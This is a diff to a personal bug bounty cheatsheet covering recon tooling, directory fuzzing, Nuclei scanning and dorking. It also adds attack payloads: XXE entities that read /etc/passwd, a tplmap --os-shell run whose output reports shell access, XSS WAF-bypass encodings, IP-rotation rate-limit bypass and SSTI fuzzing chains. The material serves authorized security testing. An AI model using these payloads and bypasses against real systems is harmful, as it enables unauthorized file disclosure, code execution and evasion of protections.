@@ -2,7 +2,7 @@
 title: Bug Bounty Cheatsheet
 tags: [Bug Bounty,Web App,Subdomain Enumeration,Cheatsheet]
 published: true
-description: A place for me to store my notes/tricks for Bug Bounty Hunting - Big Work in Progress :). 
+description: A place for me to store my notes/tricks for Bug Bounty Hunting - Big Work in Progress. 
 toc: true
 image: https://i.pinimg.com/originals/7a/b0/b8/7ab0b884b7050bbae9cc976409cd5567.png
 thumbnail: https://i.pinimg.com/originals/7a/b0/b8/7ab0b884b7050bbae9cc976409cd5567.png
@@ -36,7 +36,9 @@ Also before I continue these are my main references that have helped me build my
 
 *Credit too Jason Haddix for ^*
 
+### Random DNS Pic
 
+<img src="https://dz2cdn1.dzone.com/storage/temp/14019029-how-dns-works3.png">
 
 ### [](#header-2) Initial Stuff
 
@@ -50,11 +52,11 @@ Also a small tip moving forward, if you are going to get into Bug Bounty I recom
 
 
 
-My personal preference is Linode.com as I have used them for 4/5 years without a single issue and it is not a pay-as-you-go service like DigitalOcean.
+My personal preference is DigitalOcean due to the simplicity of deployment / provisioning and backups. - You can use my referral code below to get $100 **FREE** Credit over a 60-Day Period :)
 
 
 
-Referral Code: https://www.linode.com/?r=91c07fff7abd148b08880020c558d5cace801cc3
+Referral Code: https://m.do.co/c/aa9fa82f580a
 
 
 
@@ -99,6 +101,20 @@ Btw, some people will tell you to use massscan due to the speed but I find it mi
 
 
 *More to follow here....* 
+
+### [](#header-3) Automation Frameworks
+
+As more and more bug bounty hunters and researchers are moving towards continuous automation, with most of them writing or creating there own solutions I thought it would be relevant to share some open-source existing framworks which can be used.
+
+#### Sp1der
+
+```powershell
+#https://github.com/1N3/Sn1per
+
+This is awesome and allows you to automate many things, although it costs $200 for a license it seems worth it.
+
+Considering the average payout of a bounty $200 isnt really much at all :) 
+```
 
 
 
@@ -183,8 +199,13 @@ Needs SPYSE_API_TOKEN environment variable set (the free version always gives th
 ```
 
 
+#### Chaos - Project Discovery
 
+```
+- Requires a BETA Tester Key to function
 
+chaos -d domain.com
+```
 
 
 
@@ -500,6 +521,15 @@ wfuzz -c -f re -w /SecLists/Discovery/DNS/subdomains-top1mil-5000.txt -u "http:/
 I wasn't sure if I should add this under **Subdomain Enumeration** but doesn't really matter. Here are a few techniques to discover subdomains and ports via companies publicly available ASN numbers. 
 
 
+#### Reverse WHOIS on Company Name with Whoxy
+
+```powershell
+#Requires a paid API key, but well worth the money :) 
+
+curl "http://api.whoxy.com/?key=xxxxx&reverse=whois&mode=micro&company=Uber+Technologies,+Inc." | jq -r '.search_result[].domain_name'
+
+```
+
 
 #### ASNLookup
 
@@ -548,8 +578,7 @@ I have found to have really good results using `amass enum` here + large CIDR ra
 
 
 
-
-### [](#header-3) Basic Content Finding
+### [](#header-3) Content Discovery
 
 Here I will discuss some basic tactics once you have a nice list of live subdomains
 
@@ -733,6 +762,18 @@ ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u http
 
 ```
 
+#### DirSearching with FFUF Loop (September 2020)
+
+```powershell
+ffufhttpservices(){
+for i in $(cat newsubs.httprobe); do  ffuf -u $i/FUZZ -w /root/Wordlists/NewWordlist.txt \
+-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
+-c -fs 0 -t 30 -mc 200 -recursion ; done | tee xxxxx;
+cat xxxxx | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee ffuf.results; rm xxxxx;
+
+#Need to add a check if http/https both exist to only run https mayb?
+}
+```
 
 
 #### EyeWitness - Source View
@@ -771,6 +812,22 @@ http://web.archive.org/cdx/search/cdx?url=*.visma.com/*&output=text&fl=original&
 
 ```powershell
 Bash alias already created in profile on VPS - getallurls or getallurlsloop
+```
+
+#### GoSpider
+
+```powershell
+#https://github.com/jaeles-project/gospider
+
+- Run with single site
+
+gospider -s "https://m0chan.co.uk" -c 10 -d 1
+
+- Run with 20 sites & 10 bots each site
+
+gospider -S sites.txt -o output -c 10 -d 1 -t 20
+
+
 ```
 
 
@@ -996,6 +1053,14 @@ xlarge: 80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096
 
 
 ### [](#header-3) Google Dorks
+
+### Bug Bounty Helper Tool (Perfect for All Dorks)
+
+```powershell
+https://dorks.faisalahmed.me/#
+
+Just enter your domain/subdomain and select which you would like to dork for
+```
 
 ```powershell
 https://drive.google.com/file/d/1g-vWLd998xJwLNci7XuZ6L1hRXFpIAaF/view
@@ -1375,6 +1440,33 @@ We could also combine this with PHP Object Injection (More on that below) to hav
 
 <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
 
+Testing the Waters
+
+<?xml version="1.0" encoding="utf-8"?>
+
+Testing the Waters #2
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+<!ENTITY % m0chan SYSTEM "file:///etc/passwd">
+%m0chan;
+]>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>
+&xxe;
+</foo>
+
+
+Base64
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+
 This is the basis, if you want the proper example go and buy the Bug Bounty Playbook.pdf :) Its my favourite book for bug bounty.
 ```
 
@@ -1397,6 +1489,11 @@ I am not going to explain SSRF here as its fairly straight forward and a lot of 
 
 For other payloads check out Payload All The Things
 ```
+
+
+#### Amazing SSRF Mindmap - Credit @hackerscrolls
+
+![img](https://raw.githubusercontent.com/hackerscrolls/SecurityTips/master/MindMaps/SSRF.png)
 
 #### Server-Side-Request-Forgery Pt (PDF Convertors)
 
@@ -1430,9 +1527,6 @@ Reference: https://medium.com/@GeneralEG/escalating-ssrf-to-rce-f28c482eb8b9
 
 From here it can be very easy to escalate to RCE by gaining read/write on the bucket and uploading a shell.
 
-
-
-
 ```
 
 
@@ -1449,11 +1543,45 @@ More on this soon :)
 ```
 
 
-#### Server Side Template Injection
+#### Server Side Template Injection (SSTI)
 
 ```powershell
 #https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 More on this soon :) 
+
+My primary goto for exploiting SSTI issues is tplmap which is really just sqlmap for template injection vulnerabilities.
+
+#https://github.com/epinna/tplmap
+
+$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
+
+$ ./tplmap.py -u 'http://www.target.com/page?name=John'
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'name' is injectable
+[+] Smarty plugin is testing rendering with tag '{*}'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+...
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
+[+] Tplmap identified the following injection point:
+
+  GET parameter: name
+  Engine: Jinja2
+  Injection: {{*}}
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell command execution: ok
+   Bind and reverse shell: ok
+   File write: ok
+   File read: ok
+   Code evaluation: ok, python code
+
 ```
 
 
@@ -1565,7 +1693,7 @@ SSRF
 #### XXE File Upload SVG
 
 ```powershell
-#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+#https://scottc130.medium.com/understanding-xxe-vulnerabilities-7e389d3972c2
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
@@ -1617,3 +1745,115 @@ Full details above.
 4) JWT Crack - https://github.com/brendan-rius/c-jwt-cracker - Secret used to encrypt tokens may be weak.
 ```
 
+
+
+#### Rate Limiting bypass with IP Rotate
+
+```
+Sometimes rate limiting for authentication or OTP are based off source IP, this can be bypassed using Amazon API's and IP Rotate. 
+
+https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874
+```
+
+
+
+#### IDOR Tricks & Bypasses
+
+```
+If fields are passed in clientside requests try another db Field - https://twitter.com/m0chan98/status/1286215630253850625/photo/1
+
+
+https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b
+
+```
+
+
+#### Nuclei
+
+```powershell
+Can take numerous templates across various hosts to find known vulnerabilities. 
+
+Requires you specify a custom user agent unless Cloudfare drops all traffic.
+
+nuclei -l newsubs.httprobe -c 60 -t /root/tools/BotTemplates/ -o newsubs.httprobe.nuclei -H "User-Agent: User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100"
+```
+
+
+
+#### Artifactory Stuff
+
+```powershell
+#https://www.errno.fr/artifactory/Attacking_Artifactory
+
+```
+
+
+#### Cross-Site Scripting Bit n Bobs
+
+```powershell
+Got a lot to add here (naturally) but for the time being just noting down this bypass.
+
+If exploiting <a href></a> xss and "javasript" is blocked by WAF or URL then try the below.
+
+Add any number of \n \t or \r in the middle
+java\nscript:
+
+Add characters from \x00- \x20 at the beginning
+
+\x01javascript:
+
+
+Randoomize the case
+
+jaVAscrIpT:
+
+Can also use the below to get rid of the word JavaScript all together
+
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+
+```
+
+<img align="center" src ="https://pbs.twimg.com/media/Eir5smxXcAcJ4QX?format=jpg&name=large"></img>
+
+
+
+#### Quick SSTI (RCE) Tip from Twitter
+
+```powershell
+#Full credit goes too - https://twitter.com/MrDamanSingh/status/1317042176337932291
+
+Had to save this here as I thought it was pretty sick
+
+root@m0chan:~ waybackurls http://target.com | qsreplace "m0chan{{9*9}}" > fuzz.txt
+root@m0chan:~ ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
+(captured requests in burp)
+search: m0chan81 in burp
+
+Could also apply to a few other things beside SSTI
+
+WIP: Could also pass all QReplaced URLs to Nuclei and Grep for 81 and trigger alert?
+```
+
+
+#### QSReplace
+
+```powershell
+I wasnt sure where to add the section on QSReplace but felt it warranted it's own section.
+
+#https://github.com/tomnomnom/qsreplace
+
+Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.
+
+
+This can be super useful for findings things such as RXSS, LFI, SSRF , SSTI & RCE.
+
+For example we could replace all parameters with a burp collaborator such as 
+
+root@m0chan:~ cat urls.txt | qsreplace collab.m0chan.co.uk
+https://example.com/path?one=collab.m0chan.co.uk&two=collab.m0chan.co.uk
+https://example.com/pathtwo?one=collab.m0chan.co.uk&two=collab.m0chan.co.ukl
+https://example.net/a/path?one=collab.m0chan.co.uk&two=collab.m0chan.co.uk
+
+```
